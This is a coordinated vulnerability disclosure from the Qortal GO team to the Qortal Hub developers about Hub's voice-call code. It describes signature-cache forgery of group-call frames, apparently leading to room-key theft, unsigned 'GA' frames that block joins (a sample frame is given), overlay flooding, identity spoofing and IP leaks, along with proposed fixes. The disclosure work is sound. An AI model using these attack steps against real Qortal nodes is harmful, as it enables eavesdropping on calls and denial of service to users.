# Qortal Hub calls: security, privacy and bug report from the Qortal GO team

Hi Hub team,

We maintain Qortal GO, the Android fork of Qortal Hub. We are adding 1:1 and group voice calls to GO, and GO has to work with unmodified Hub 3.0.x peers. So we read Hub's call code closely: `CallManager`, `GroupCallManager`, the group-call runtime, the WebRTC transports, community STUN and the Python bridge. This report lists what we found.

> **Please handle Section 1 (Security) privately.** Several of these items can be abused today by anyone who can reach the Reticulum overlay. We suggest fixing them before they are discussed in public issues or release notes. Sections 2 to 4 are fine to discuss in the open.

**Refs checked (upstream code, not our fork)**

- tag `v3.0.3` @ `f3b75daa`
- `develop` @ `ae338f34` (2026-10-05)

**Line numbers.** Where we give one line number, the file is byte-identical in the two refs, so the number is valid for both. This covers:

- `electron/src/`: `call.ts`, `group-call.ts`, `group-call-wire-reticulum.ts`, `ed25519-verify-common.ts`, `presence.ts`, `stun-coordinator.ts`, `stun-cache.ts`, `stun-bootstrap.ts`, `stun-udp-server.ts`, `system-call-readiness.ts`, `audio-surface-ipc.ts`, `reticulum-daemon.ts`;
- `src/hooks/useVoiceCall.ts`, `src/lib/call/*` and `src/lib/group-call/*`;
- the call components and contexts we cite;
- `public/worklets/*` and `docs/group-audio-calls.md`.

The cited lines of `src/components/Group/Group.tsx`, `src/background/reticulum-signing-policy.ts` and `electron/scripts/build-rnsd-frozen.py` are also the same in both refs. Four files differ between the refs, so for them we give both numbers as "v3.0.3 `:A` / develop `:B`": `electron/resources/presence_bridge.py`, `electron/src/setup.ts`, `electron/src/reticulum-bridge.ts` and `electron/src/preload.ts`.

**Reticulum (RNS) sources** (B-15 only). RNS 1.4.2 is the package your `build-rnsd-frozen.py` installs (`Philreact/Reticulum` master, read at `63ca9d5a`); the Hub AppImage in our lab bundles rns 1.4.2 too. We also give the numbers in RNS 1.3.4, the version GO ships. Both versions have the same announce rate logic.

**How we checked.** Each item is marked:

- **[V]** verified by reading the code at both refs;
- **[T]** reproduced with a small test harness that runs the unmodified upstream code (Appendix A), or measured in our lab or on the live network (B-15);
- **[I]** inferred: the code path is verified, but the effect depends on Chromium or network behaviour that we did not run end to end.

We left out anything we could not confirm in the code. Unless an item says otherwise, the suggested fix is local and keeps every 3.0.x peer working.

---

## Summary

| #        | Issue                                                                                                                                     | Category             | Severity     |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------- | -------------------- | ------------ |
| **S-1**  | The verified-signature cache is keyed by signature only, so forged GC_JOIN, GC_LEAVE and GC_TOPOLOGY frames are applied without any check | security             | **critical** |
| **S-2**  | Unsigned `GA` activity frames can stop anyone from joining a group call ("call full")                                                     | security (DoS)       | high         |
| **S-3**  | Overlay hop limit `L` is never clamped, relays forward before verifying, and the seen-id maps and pre-join buffer are unbounded           | security (DoS)       | high         |
| **S-4**  | An audio link's peer identity is overwritten by a self-claimed sender hash                                                                | security (hardening) | medium       |
| **S-5**  | The group room key is never rotated when someone leaves or is removed                                                                     | security             | medium       |
| **S-6**  | Decrypted audio packets add roster entries and clear leave tombstones                                                                     | security / bug       | medium       |
| **S-7**  | GC_TOPOLOGY `clusters` and GC_LEAVE `j` are not covered by the signature, and GT has no time window                                       | security (hardening) | low          |
| **P-1**  | WebRTC sends every host and public candidate, and call windows have no IP-handling policy                                                 | privacy              | high         |
| **P-2**  | 1:1 call signalling (caller, callee, timing) is flooded to every overlay Hub as readable JSON                                             | privacy              | high         |
| **P-3**  | Group and DM-voice join/leave frames are flooded to every Hub, and the DM voice room id can be reversed                                   | privacy              | high         |
| **P-4**  | There is no "Reticulum only" (hide my IP) setting; WebRTC is a compile-time choice                                                        | privacy              | medium       |
| **P-5**  | There is no relay (TURN) or user-defined ICE server option                                                                                | privacy              | medium       |
| **P-6**  | Community STUN contribution is on by default (UPnP, public IP announced), and anyone can announce endpoints                               | privacy              | medium       |
| **P-7**  | Group root election is a fixed public hash, so a stranger in an open group can grind their way to root                                    | privacy / security   | medium       |
| **P-8**  | Opus VBR without padding, plus the RTP audio-level header on the native track                                                             | privacy              | low          |
| **B-1**  | The call readiness gate blocks calls for the first 15 s and whenever CPU is above 65%                                                     | bug                  | high         |
| **B-2**  | Unanswered calls never end in the UI (no event when the 60 s timeout fires)                                                               | bug                  | high         |
| **B-3**  | The group member allowlist is frozen at join time                                                                                         | bug                  | high         |
| **B-4**  | The group DataChannel keeps "sending" while ICE is disconnected, with no Reticulum fallback                                               | bug                  | medium       |
| **B-5**  | CALL_REQUEST is sent once, by overlay flood only                                                                                          | bug                  | medium       |
| **B-6**  | A busy callee silently ignores a second incoming call                                                                                     | bug                  | medium       |
| **B-7**  | CALL_REJECT has no overlay fallback                                                                                                       | bug                  | medium       |
| **B-8**  | The multi-device cancellation stops working 30 s after the request                                                                        | bug                  | medium       |
| **B-9**  | Python drops reliable control frames that arrive on a "non-canonical" audio link                                                          | bug                  | medium       |
| **B-10** | Link-auth is sent once as a lossy packet, control frames get the 320 ms media deadline, and early control is dropped                      | bug                  | medium       |
| **B-11** | Signature time windows are tight and differ by message type                                                                               | bug                  | medium       |
| **B-12** | `capture-processor.js` uses a bare `instanceof SharedArrayBuffer`                                                                         | bug                  | low          |
| **B-13** | Hard-coded English in the call UI                                                                                                         | bug                  | low          |
| **B-14** | Dead code, docs drift and type drift in the call area                                                                                     | bug (code health)    | low          |
| **B-15** | Community STUN discovery runs on RNS announces, which transport nodes rate-limit, so new installs and phones hear very few endpoints      | bug                  | medium       |
| **X-1**  | Capability is resent every 12 s forever, and RTC signals can only travel over an audio link                                               | suggestion           | low          |
| **X-2**  | Optional "don't make me forwarder" hint for phones                                                                                        | suggestion           | medium       |
| **X-3**  | Optional ringing acknowledgement and CALL_REQUEST re-broadcast                                                                            | suggestion           | low          |
| **X-4**  | Allow calling an account whose presence has lapsed                                                                                        | suggestion           | low          |
| **X-5**  | A separate Python lane for call signalling, and slimmer queue diagnostics                                                                 | suggestion           | low          |

---

## How GO interoperates

GO does not change any wire format, signed field set or message type. It speaks Hub 3.0.3's call protocol as written.

**GO runs your call managers unmodified.** GO hosts your `CallManager` and `GroupCallManager` in its WebView. `electron/src/call.ts`, `group-call.ts`, `group-call-wire-reticulum.ts`, `ed25519-verify-common.ts` and `presence.ts` are byte-identical to v3.0.3 in our tree. A small adapter connects them to GO's Python bridge. The Python call-signalling, audio-link and community-STUN functions we compared are identical to v3.0.3. GO's `presence_bridge.py` differs in a few other functions on the same paths, and none of them changes the wire:

- the scheduler lane mapping: DM chat control and DM pages get their own lanes, and call commands still share `control-send`, see X-5;
- overlay peer admission and back-off: this account's other devices get reserved inbound slots, shared with call-pinned peers;
- a separate lock for the scheduler statistics;
- an audio-latency monitor that idles while no audio link is open.

GO's host also wraps the community-STUN query command to throttle it (item 7). The shared renderer code (`useVoiceCall.ts`, `src/lib/call`, `src/lib/group-call`) has a few GO-only changes behind a platform check. So most items in this report affect GO exactly as they affect Hub, and a Hub fix reaches GO when we update those files.

The list below covers what GO does differently **on its own side**, so you can match it where you agree.

> **Which GO this describes.** GO's development tree of 19 October 2026 (after v0.0.18). It is not released yet. We tested a build from earlier that day in our lab against Hub 3.0.3 (see "Tested interop"). Items marked **(built, not lab-tested yet)** were added after that test. Items marked **(planned)** are not built yet. We will re-check this list against the release before it ships and tell you what changed.

1. **WebRTC first, with local addresses removed.** For 1:1 calls GO uses Hub's protocol unchanged: capability `native_audio_v1`, GC_RTC_SIGNAL over the audio-link Channel (GO0/GO1), caller offers and callee answers. GO wraps `RTCPeerConnection` in its WebView, so the filter below covers 1:1 audio, group DataChannels and the screen-share viewer. Before a candidate or SDP reaches the code that signs it, GO:
   - drops every `typ host` candidate;
   - drops every candidate whose address is not public: private (10/8, 172.16/12, 192.168/16), CGNAT (100.64/10), loopback, link-local (169.254/16, fe80::/10), IPv6 unique-local (fc00::/7), other reserved ranges, an mDNS `.local` name, or anything it cannot parse;
   - drops server-reflexive candidates on IPv6. Without NAT, that address is the phone's own. Only a relay candidate may be IPv6;
   - sets `raddr`/`rport` to `0.0.0.0` (or `::`) and `0` on every candidate it keeps. With microphone permission Chromium no longer blanks these itself, and on a srflx candidate they carry the phone's LAN address;
   - removes the matching `a=candidate` lines from its local SDP, and replaces a `c=` or `a=rtcp:` default address that is not one of the kept candidates with `0.0.0.0` (port 9). Before STUN answers, that default address is the host address.

   GO also applies only the peer's **public IPv4** candidates (from `addIceCandidate` and from `a=candidate` lines in the remote SDP). ICE checks go out from the phone's own sockets, and the peer learns their source address as a peer-reflexive candidate. A check to a Hub's LAN, CGNAT or IPv6 candidate would therefore show the phone's LAN, CGNAT or IPv6 address.

   Only public IPv4 server-reflexive candidates leave the phone. Because the filtering happens before signing, Hub's signature checks pass; in our lab Hub 3.0.3 accepted GO's filtered offers and answers. The cost: no WebRTC over IPv6, and none inside one LAN unless the router supports hairpin NAT. Those calls stay on Reticulum media, which Hub already handles.

2. **"Private calls (Reticulum only)" setting.** It is off by default. When the user turns it on, GO hides `window.groupCall.sendRtcSignal`. The shared hook then never prefers WebRTC, the group runtime cannot send any RTC signal, and GO never acknowledges a Hub's capability, in 1:1 or group calls. GO's audio surface also refuses to start a WebRTC leg. Any PeerConnection that is still created gets no ICE servers and `iceTransportPolicy: 'relay'`, and every candidate is suppressed in both directions. So nothing is gathered, no STUN packet leaves the phone and no IP address is exchanged. Hub peers retry their capability for about 33 s (`useVoiceCall.ts:1102-1150`) and then stay on Reticulum media. We suggest Hub offers the same setting (P-4).
3. **GO is a leaf on the overlay.** GO never re-floods other people's overlay frames: its adapter drops the relays that `call.ts` and `group-call.ts` would send. So GO adds nothing to the flood volume behind P-2, P-3 or S-3. Hub's own in-room relay of a joiner's verified GJ and GI to the current root still runs on GO (`group-call.ts:3743-3783`). That is a targeted send, but it falls back to the overlay flood when the root's hash is unknown (`:4258-4267`), exactly as on Hub. For its own frames:
   - its CALL_REQUEST goes pinned to each known endpoint of the callee and also by overlay flood, because some Hubs are only reachable through the overlay. The pinned copy is the same signed overlay frame: target `U`, and the same `X` and `L` as the flood copy. Whichever copy reaches the callee first is relayed like a flood copy, so the callee's other devices are still reached, and `X` dedupe stops double processing. It needs `U`, because a direct-chat CR has no `H` (see P-2);
   - its GJ, GI and other CALL\_\* frames come from your managers, with your formats and send paths. The one difference: GO's adapter marks link control frames so that its Python never applies the media deadline to them (B-10).
4. **Signatures.** GO signs GC*JOIN without `rk`, and sends `rk` in the separate GI (GC_JOIN_RK), because that is your code. It verifies every inbound GC*_ and CALL\__ frame. GO wraps your verified-signature cache so that a hit counts only when the signed fields and the public key match exactly what was verified; anything else goes through a full verify (S-1).
5. **Group calls follow Hub's rules exactly.** That includes the member allowlist, the cap of 15, the sha256 election, and acting as root or cluster forwarder when elected (sending GT, distributing GC_KEY, forwarding audio). When the phone is forwarding, GO shows the user a small "You're relaying audio" note.
   - GO refreshes the member allowlist from its node every 60 s while a call runs (B-3).
   - GO applies Hub's `GA` participant-count rule unchanged for now. **(planned)** Treat `GA` counts as a display hint only and never refuse to join because of them (S-2).
6. **Ending calls.**
   - Declines, hang-ups and cancellations come from your `CallManager`, including the reason-signed CX followed by a legacy CX.
   - When your `CallManager` silently drops an unanswered call after 60 s, GO ends its own ringing or calling UI (B-2).
   - Its `reject` and `hangup` calls always succeed for unknown call ids, like the desktop IPC handlers.
   - **(planned)** If GO is already in a call, it will answer a second incoming call with reason `busy`, which Hub 3.0.3 shows as "declined" (B-6).
7. **STUN.** GO never contributes a STUN endpoint: no UPnP, no endpoint announce, and it never answers discovery queries. It uses at most 6 community endpoints per call, like Hub's top 6.
   - In the build we lab-tested, GO used only endpoints still inside their announce lease, without probing them. Every request for ICE servers also sent a discovery query announce (B-15).
   - **(built, not lab-tested yet)** GO now keeps a local cache of heard endpoints, like `stun-cache.db`: at most 32, each forgotten 24 h after it was last heard or last answered a probe. A cached endpoint is used only if it answered a STUN probe in the last 8 min. Probes use Hub's budget (3 at once, 18 a minute, 1.5 s timeout) and run only when a call asks for ICE servers. Endpoints still inside their announce lease are used first, as before, without a probe.
   - **(built, not lab-tested yet)** GO's host lets Python's discovery query announce out at most once every 10 min. It wraps `handle_get_community_stun_endpoints`; GO's `presence_bridge.py` itself is unchanged. Other requests get the live list without an announce.
   - **(built, not lab-tested yet)** In Private calls GO sends no STUN probes at all.
8. **Clock. (planned)** Warn the user when the phone clock is more than a few seconds off. Hub silently drops CALL\_\* frames more than 10 s in the future and RTC signals more than 20 s off (B-11).

---

## Tested interop

In our lab, GO ran on an Android emulator and an unmodified Hub 3.0.3 AppImage ran on a desktop, behind the same home NAT, with test accounts and the public Qortal Reticulum transport nodes. We tested two GO builds: 18 October (our own port of the call code) and 19 October (your managers hosted unmodified).

**What worked**

- **Friends first.** Both accounts had to add each other as friends. Hub 3.0.3 refuses to call someone who is not a friend ("Add … as a friend before calling").
- **1:1 call, GO calls Hub (both builds).**
  - Hub rang. After Accept, both sides joined the DM voice room, and the Hub logged the room key as verified.
  - Reticulum audio flowed both ways. On 19 October that was about 5,600 frames each way, with no send failures.
  - The audio-link round trip was about 370–450 ms (median about 400 ms).
  - Hanging up on GO ended the call on the Hub, and the Hub added a "Voice call" history entry.
- **1:1 call, Hub calls GO (18 October build).**
  - GO showed its incoming call screen. After Accept, Reticulum audio flowed both ways.
  - Hanging up on the Hub ended the call on GO.
- **WebRTC signalling with GO's filter (19 October).**
  - The capability, offer and answer crossed over GO0/GO1 in both directions and verified.
  - ICE then stayed in `checking` until `ice-server-refresh-expired`. GO had no STUN servers at that moment (B-15), its filter drops LAN candidates, and both ends were behind the same NAT.
  - Reticulum carried the call, as designed.
- **Group call (19 October).**
  - GO started the call and was elected root. It sent GJ and GI, then a GT every 5 s.
  - The Hub showed the call activity, joined, and both sides showed 2 participants.
  - Link-auth, GC_KEY and the RTC capability, offer, answer and candidates were exchanged both ways. The group DataChannel failed ICE for the same reason as above.
  - Leaving worked from both sides.

**What we still see.** We have not found the cause of these yet. We think they are on GO's side, and we will tell you if any turn out to be Hub-side.

- In 1:1 calls, GO's hook sends its room-key request 6 times (`dm-key-request:retry-1` to `-6`), and the Hub logs "room key applied" each time.
- In the group call, GO (as root) re-sent GC_KEY to the Hub about every 2 s for the whole call.
- GO-to-Hub group audio arrived in bursts. The Hub's Python receive callback saw gaps of 350–1000 ms, against 3–4 ms on the 1:1 path, and GO showed "Weak connection".

**Also seen, on the Hub side.** During a GO-to-Hub 1:1 call, a second Hub logged in to the same account as GO opened its own audio link to the callee's Hub. That comes from Hub, not GO, and may be Hub's normal multi-device behaviour. We did not look into it.

**Not tested yet:** a Hub calling the 19 October build, a working WebRTC leg between GO and a Hub on different networks, a group call where a Hub is root, and everything marked **(built, not lab-tested yet)** above.

---

## 1. Security (please handle privately)

### S-1. The verified-signature cache is keyed by signature only, so forged GC_JOIN, GC_LEAVE and GC_TOPOLOGY frames are applied without any check

- **Category:** security
- **Severity:** critical. The roster forgery is [T], and so is the `gcall:participant-joined` event that carries the attacker's key. The key theft that follows is [I]: we followed it through the code but did not run it end to end.

**Where**

- `electron/src/group-call.ts:2750-2752`: the cache key is `` `${type}:${signature}` ``.
- `group-call.ts:2755-2768`: `rememberVerifiedGcSignature`, called after a successful verify at `:2822`.
- `group-call.ts:2785-2802`: in `enqueueVerify`, a cache hit applies `join`, `join_rk`, `link_auth_join`, `leave`, `topology` and `cluster_heartbeat` jobs with the **new** envelope. No verification runs.
- The only other filter is the overlay "logical" dedupe. It is keyed `t:g:<signature>` and lasts 10 s (`:1993-2015`, `:438`). It does not catch frames sent directly (without overlay `X`/`L`), or frames sent more than 10 s after the original.

**Symptom**

A Reticulum node only needs to have seen one valid signature of a given type. GJ floods reach every overlay Hub (see P-3), so this is easy. The node can then send frames that reuse that signature with a different `fromAddress`, `fromPublicKey`, `roomId`, `reticulumDestinationHash` and `timestamp`.

We ran the unmodified `GroupCallManager` against such frames (Appendix A). The table shows what happened.

| Forged frame                                                                                                   | Result                                                                         | Signature checks |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ---------------- |
| GJ with a new address and key, reusing someone else's GJ signature                                             | The new participant was added to the room                                      | 0                |
| GJ reusing a member's own signature, with a newer timestamp and a different `d`                                | That member's roster row moved to the attacker's Reticulum destination         | 0                |
| GJ keeping a member's address but carrying the attacker's public key                                           | That member's row now holds the attacker's public key                          | 0                |
| An outsider sends one valid GC_LEAVE of its own, then reuses that signature with another participant's address | `gcall:participant-left` fired, and that participant was removed from the room | 0                |

For Qortal group rooms, the member allowlist still checks `fromAddress`. But the attacker simply uses a real member's address.

The third result is the dangerous one. The forged GJ has a newer timestamp, so it counts as a refreshed join (`group-call.ts:11211-11223`). The manager then emits `gcall:participant-joined` carrying the attacker's public key (`:11324-11328`). Our harness saw exactly that event [T]. [I] From there we followed the code but did not run it:

1. The renderer runtime replaces that member's public key in its own roster (`src/lib/group-call/groupCallAudioEngineRuntime.ts:4996-5008`, in `upsertParticipantFromRuntimeEvent`).
2. If this Hub is root, it calls `maybeSendRoomKeyToJoiningParticipant` (`:5905-5912`, `:10319-10347`).
3. `sendTargetedRoomKey` (`:10476`) encrypts the room key to the attacker's public key (`encryptRoomKeyForRecipients`, `:967-1005`) and sends it towards the destination in the forged roster row.

So an outsider can most likely obtain the room key and receive the forwarded audio of a group call.

**Cause.** The cache key covers neither the signed content nor the signer's public key.

**Proof** (`group-call.ts:2750-2752`, then `:2785-2796`)

```ts
  private gcSignatureCacheKey(type: string, signature: string): string {
    return `${type}:${signature}`;
  }
    const cacheKey = this.gcSignatureCacheKey(env.type, env.signature);
    if (this.verifiedGcSignatures.has(cacheKey)) {
      if (
        job.kind === 'join' ||
        // … join_rk, link_auth_join, leave, topology, cluster_heartbeat
      ) {
        try {
          this.applyVerifiedJobSync(job);
```

**Suggested fix.** Key the cache on everything that was verified. `fields` and `fromPublicKey` are already arguments of `enqueueVerify`. `canonicalizeForSigning` (exported from `presence.ts:592`) is the function the signature itself covers. `group-call.ts` already imports `crypto` as `nodeCrypto` (`:24`), but it imports only a type from `presence.ts` (`:32`), so add the value import.

```ts
// group-call.ts, next to the existing type-only presence import (:32)
import { canonicalizeForSigning } from './presence';

  private gcSignatureCacheKey(
    fields: Record<string, unknown>, signature: string, fromPublicKey: string
  ): string {
    const digest = nodeCrypto
      .createHash('sha256')
      .update(canonicalizeForSigning(fields))
      .digest('hex');
    return `${digest}:${fromPublicKey}:${signature}`;
  }
```

Then:

- build the key once in `enqueueVerify` (`:2785`), where it also guards `inFlightGcVerify`;
- change `rememberVerifiedGcSignature` (`:2755`) to take that key, or `fields` and `fromPublicKey`, instead of `(type, signature)`, and pass it at `:2822`.

Alternatively, drop the cache for these job kinds: an Ed25519 verify is cheap.

**Compatibility.** Local only, with no wire change. GC_KEY, GC_KEY_REQUEST and GC_RTC_SIGNAL are not affected: on a cache hit they are dropped rather than applied, and inbound RTC signals call `verifyPool.verify` directly (`:5204`).

**GO.** GO never applies a GC\_\* frame from a signature-only cache (see "How GO interoperates", item 4).

---

### S-2. Unsigned `GA` activity frames can stop anyone from joining a group call ("call full")

- **Category:** security (denial of service)
- **Severity:** high [V]

**Where**

- `group-call.ts:862-904`, `decodeGcReticulumActivityWire`. It checks types, `0 < p <= 10000`, age up to 7 s (`:244`) and future skew up to 30 s. There is no signature check and no sender check.
- `group-call.ts:4659-4669`: any `GA` updates the spectator liveness and participant count of `gcall-qortal-<g>` (stored at `:4404-4420`).
- `group-call.ts:4334-4350`: when this Hub is not yet in the room, `shouldRejectLocalJoinAtParticipantCap` compares that unsigned count with the cap of 15.
- `group-call.ts:5290-5291`: `joinRoom` throws `group_call_full:15`.
- The frame is relayed to other Hubs before any of these checks run (`:4641-4650`).

**Symptom.** A node sends `{t:'GA', g:<groupId>, m:<now>, p:15}` with overlay metadata every few seconds. Every Hub that is not already in that group's call then refuses to join it, and shows a fake active call with 15 people. Group ids are public, so this works for private groups too. Even without `p`, anyone can light up "call active" badges for any group.

**Proof** (`group-call.ts:4340-4349`, then `:5290-5291`)

```ts
    if (room) {
      return (
        !room.participants.has(localAddress) &&
        room.participants.size >= MAX_QORTAL_GROUP_CALL_PARTICIPANTS
      );
    }
    return (
      this.getSpectatorParticipantCount(roomId) >=
      MAX_QORTAL_GROUP_CALL_PARTICIPANTS
    );
    if (this.shouldRejectLocalJoinAtParticipantCap(roomId, localAddress)) {
      throw new Error(`group_call_full:${MAX_QORTAL_GROUP_CALL_PARTICIPANTS}`);
```

**Suggested fix.**

- Treat the spectator count as a hint for the UI only. Enforce the cap only on the verified GC_JOIN roster, which `shouldRejectRemoteJoinAtParticipantCap` already does once a Hub is in the room. In practice, return `false` from the spectator branch.
- Optionally, show "call active" only after a verified GJ for that room has been seen.

**Compatibility.** Local only. Old Hubs keep sending unsigned GA, and it still works as a hint. A signed GA would need a new, optional field set.

**GO.** GO runs Hub's rule unchanged today, so it has the same exposure. **(planned)** Treat GA as a display hint only.

---

### S-3. Overlay hop limit `L` is never clamped, relays forward before verifying, and the seen-id maps and pre-join buffer are unbounded

- **Category:** security (denial of service)
- **Severity:** high. The code is [V]; the network-wide effect is [I].

**Where**

- **1:1 calls.**
  - `call.ts:33`: `CALL_MAX_HOPS = 4`.
  - `call.ts:2713-2730`: `parseReticulumOverlayMeta` has no upper clamp (`:2728`).
  - `call.ts:2316-2325`: the frame is relayed to all neighbours _before_ it is handed to the handlers that verify it (`:2337-2349`).
- **Group calls.**
  - `group-call.ts:435`: `GC_RETICULUM_OVERLAY_HOPS = 4`.
  - `group-call.ts:4012-4021`: no clamp (`:4020`).
  - `group-call.ts:4641-4650`: the frame is relayed before type dispatch and before any verify.
- **Seen-id maps.** `call.ts:2732-2741` (TTL 60 s, `:35`) and `group-call.ts:4032-4044` (TTL 120 s, `:436`). Neither map has a size cap, and every insert scans the whole map.
- **Pre-join buffer.** For any room this Hub has not joined, `handleJoin` buffers the **unverified** GJ (`group-call.ts:10827-10837`). The buffer holds 16 entries per room but has no limit on the number of rooms (`:3418-3440`). Entries live for 120 s (`:1963`).
- **Python.** Python never reads `L` (no `"L"` or `'L'` anywhere in `presence_bridge.py` in either ref). Its relay dedupe works only by `X` (`_call_relay_dedup_key` and `_filter_new_call_relay_frames`, v3.0.3 `:13525`, `:13548` / develop `:13784`, `:13807`).

**Symptom [I]**

- One frame with a fresh `X` and a huge `L` is forwarded once by every Hub it reaches. That is the whole connected overlay, not 4 hops.
- A stream of unique `X` values grows the seen maps (rate × 60–120 s), and every insert costs O(n) in the Electron main process.
- Random room ids fill the pre-join buffer.
- The resulting main-loop lag also trips the call readiness gate (B-1).

**Proof** (`call.ts:2725-2729`, then `:2319-2324`)

```ts
    return {
      overlayId: wire.X,
      targetAddress: wire.U,
      hopsRemaining: Math.max(0, Math.trunc(wire.L)),
    };
      if (overlayMeta.hopsRemaining > 0) {
        const forwarded = {
          ...wire,
          L: overlayMeta.hopsRemaining - 1,
        };
        this.broadcastReticulumOverlayWire(forwarded, [peerPresenceHash]);
```

**Suggested fix**

- Clamp the hop count on receive. In `call.ts`: `hopsRemaining: Math.min(CALL_MAX_HOPS, Math.max(0, Math.trunc(wire.L)))`. Do the same with `GC_RETICULUM_OVERLAY_HOPS` in `group-call.ts`.
- Give the seen-id maps a size cap with oldest-first eviction and an amortized sweep, like the logical-key map already has (`group-call.ts:440`, max 8192).
- Cap the number of rooms in `pendingGcJoinBeforeJoinRoom` (for example 64), and drop expired GJs before buffering them.
- If possible, check at least `deriveAddressFromPublicKey(k) === a` before relaying.

**Compatibility.** Fully compatible: honest frames never carry `L > 4`.

**GO.** GO is an overlay leaf. It never re-floods frames it receives, so it cannot amplify a large `L`. The only frames of other peers it sends on are Hub's in-room GJ/GI relay to the root, which it builds fresh with the normal hop count ("How GO interoperates", item 3).

---

### S-4. An audio link's peer identity is overwritten by a self-claimed sender hash

- **Category:** security (hardening)
- **Severity:** medium. The code is [V]; the attack is [I] and needs a lab test.

**Where**

- **Python overwrites the identified peer.** On every packet, `_handle_audio_link_packet` sets the link's `peerDestinationHash` and `peerPresenceHash` from a sender hash the packet claims:
  - for audio, from the QGAU header's `sender_hash` (v3.0.3 `:20053-20066` / develop `:20312-20325`);
  - for RTT and heartbeat frames, from the JSON `r` field (read at v3.0.3 `:20159`, `:20195` / develop `:20418`, `:20454`; written at v3.0.3 `:20163`, `:20199` / develop `:20422`, `:20458`).
  - This overwrites the binding that `on_audio_link_remote_identified` made from the link's identified identity (v3.0.3 `:19915-19931` / develop `:20174-20190`).
  - The only check is that the claimed hash is a known peer (`_resolve_sender_peer_destination_hash`, v3.0.3 `:12966-12977` / develop `:13225-13236`). Nothing checks that the hash belongs to the identity on the link.
- **Single packets.** When there is no link peer, `_emit_call_bridge_message` derives the peer from the wire field `r` (v3.0.3 `:13466-13477` / develop `:13725-13736`). `resolveGroupCallSourcePeerHash` also prefers `r` over the transport peer (`group-call.ts:406-415`).
- **Electron trusts these hashes.**
  - Link-auth binding uses them (`group-call.ts:11848-11861`).
  - An **expired** link-auth GC_JOIN, of any age, is accepted when its signed `d` equals the hash the link claims (`:11824-11844`, `:11906-11917`).

**Symptom [I]**

1. An attacker opens an audio link to a Hub and puts a victim's destination hash in its QGAU header.
2. It replays the victim's old GJ, captured from the overlay flood (P-3), as link-auth.
3. The Hub can now bind the attacker's link to the victim.

Signed content stays safe. But the Hub may send the attacker link-control meant for the victim, such as its WebRTC SDP and ICE, which contain its IP addresses. The victim's real link may also be closed as a duplicate. The comments at `group-call.ts:5173-5175` and `call.ts:1047-1050` say control is accepted "only from the exact authenticated link", which does not hold for single packets.

**Proof** (presence_bridge.py, v3.0.3 `:20053-20058` / develop `:20312-20317`)

```python
        if sender_call_hash:
            peer_presence_hash = _resolve_sender_peer_destination_hash(sender_call_hash)
            with _state_lock:
                state["peerDestinationHash"] = sender_call_hash
                if peer_presence_hash:
                    state["peerPresenceHash"] = peer_presence_hash
```

**Suggested fix**

- Once a link is identified, never overwrite `peerPresenceHash` from the wire. Drop the packet when `sender_hash` is not the presence destination of the identified identity.
- Pass an explicit `authenticatedPeerHash` (the link's remote identity) to Electron, and use it instead of `r` for link-bound checks.
- Do not accept an expired link-auth GJ just because it matches a self-claimed hash.

**Compatibility.** Internal only. The QGAU header and the wire stay the same, and honest peers always send their own destination.

**GO.** GO runs Hub's group-call logic here unchanged (including `resolveGroupCallSourcePeerHash`, which prefers `r`), and GO's Python has the same upstream code, so GO has the same exposure today. We will port a Hub fix.

---

### S-5. The group room key is never rotated when someone leaves or is removed

- **Category:** security
- **Severity:** medium. The code is [V]; the second consequence below is [I].

**Where**

- `src/lib/group-call/groupCallAudioEngineRuntime.ts`: a new key is created only by `randomRoomKey()` (`:908`). That happens in three places:
  - `:7097`, on a session update;
  - `:9069`, when this node becomes root and has no key;
  - `:10610`, when a key request arrives and this node has no key.
- `ensureRoomKeyAuthorityForTopology` (`:9054`) keeps the existing key (`:9062-9069`).
- The `gcall:participant-left` handling (`:5859-5887`) clears state for the leaver but does not rotate the key.

**Symptom**

- A participant who leaves, or who is kicked or banned from the group during the call, keeps the media key for the rest of the call session.
- [I] A later joiner gets the same key, so it can decrypt audio it captured earlier, for example while forwarding on the path.

**Proof** (runtime `:9062-9069`)

```ts
const previousRoomKey = this.roomKey;
const hadOwnRoomKey = this.ownsRoomKey && previousRoomKey !== null;
const adoptingExistingRoomKey = !hadOwnRoomKey && previousRoomKey !== null;
const nextRoomKey =
  hadOwnRoomKey || adoptingExistingRoomKey ? previousRoomKey : randomRoomKey();
```

**Suggested fix.** When the root sees a verified leave or a member-gate prune:

1. create a new key;
2. raise `mediaSessionGeneration`;
3. distribute the key as today.

**Compatibility.** Existing 3.0.x receivers already adopt a higher generation from the current root (`electron/src/group-call.ts:12663-12675`), so a rotating root works with old peers. Expect a short decode gap for packets still in flight with the old key.

**GO.** When GO is root it follows today's rule (no rotation), to stay identical to Hub. It will follow rotation if Hub adds it.

---

### S-6. Decrypted audio packets add roster entries and clear leave tombstones

- **Category:** security / bug
- **Severity:** medium [V]

**Where**

- `groupCallAudioEngineRuntime.ts:9672-9697`: `noteDecodedPacketActivity` calls `upsertParticipantFromRuntimeEvent(packet.sourceAddr)`.
- `:4985-5024`: that function adds any address that is not in the roster, without a public key, and clears the "recently left" tombstone (`:4997`, `:5022`).
- `src/lib/group-call/groupCallTopology.ts:33-38`: the only rejected addresses are `''` and `'unknown'`.
- `:10019-10048`: the runtime roster feeds the root election (`collectTopologyElectionAddresses`).
- The path runs right after decrypt (`groupCallAudioReceiveEngine.ts:1262-1268`, wired at runtime `:1332`).

**Symptom**

- **Honest case.** Audio still in flight after a GC_LEAVE brings the leaver back as a ghost participant and removes its leave suppression.
- **Malicious key holder.** [I] Any participant can put arbitrary addresses into everyone's runtime roster, including an address ground to win the election (P-7). Peers can then elect a root that does not exist, and the call stalls until failover.

**Proof** (runtime `:9682-9686`)

```ts
    for (const packet of packets) {
      if (packet.sourceAddr) {
        this.upsertParticipantFromRuntimeEvent(packet.sourceAddr);
        this.noteParticipantDecodedMedia(packet.sourceAddr, now);
        this.noteRootDecodedMedia(packet.sourceAddr, now);
```

**Suggested fix**

- Note activity only for addresses that are already verified participants (from GJ or link-auth).
- Never clear a leave tombstone from media.
- Drop decoded packets whose `sourceAddr` is not a verified participant.

**Compatibility.** Local only.

**GO.** GO runs this same shared runtime, so a fix here reaches GO directly.

---

### S-7. GC_TOPOLOGY `clusters` and GC_LEAVE `j` are not covered by the signature, and GT has no time window

- **Category:** security (hardening)
- **Severity:** low [V]

**Where**

- The GC_TOPOLOGY signed fields (`group-call.ts:11473-11483`) leave out `clusters` and `lastSeen`. Yet `clusters` is stored from the frame (`:11512`, `:11637`) and drives forwarding (`:6132-6214`).
- GT has epoch rules but no timestamp window.
